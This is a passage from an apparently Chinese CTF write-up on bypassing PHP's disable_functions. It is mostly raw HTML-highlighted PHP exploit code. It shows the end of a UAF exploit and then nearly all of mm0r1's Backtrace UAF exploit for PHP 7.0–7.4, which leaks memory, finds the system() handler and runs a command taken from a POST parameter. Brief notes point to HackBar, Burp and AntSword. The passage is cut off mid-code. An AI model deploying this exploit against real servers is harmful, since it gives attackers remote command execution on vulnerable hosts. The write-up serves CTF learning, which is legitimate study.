class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure><p>利用hackBar或者burp传递post数据就能获取数据</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/4.png" alt=""></p><h6 id="2-蚁剑-5">2.蚁剑</h6><p>老样子没什么好说的，用插件就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/5.png" alt=""></p><h5 id="7-Backtrace-UAF">7.Backtrace UAF</h5><blockquote><p>理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function</p></blockquote><p>题目附件：<a href="https://bugs.php.net/bug.php?id=76047">https://bugs.php.net/bug.php?id=76047</a></p><p>影响版本是7.0-7.4</p><h6 id="1-手工-3">1.手工</h6><p>exp作者：<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">exploits/php7-backtrace-bypass at master · mm0r1/exploits (github.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 